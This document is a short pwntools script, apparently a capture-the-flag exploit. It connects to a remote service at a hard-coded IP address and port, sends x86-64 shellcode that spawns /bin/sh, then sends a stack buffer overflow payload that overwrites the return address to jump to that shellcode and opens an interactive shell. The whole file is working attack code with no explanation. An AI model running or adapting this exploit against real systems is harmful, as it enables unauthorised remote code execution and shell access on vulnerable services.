from pwn import *

r = remote('140.110.112.192','2122')

r.recvuntil(':')
r.sendline('\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05')
r.recvuntil(':')
r.sendline('a'*0x28+p64(0x601080))
r.interactive()
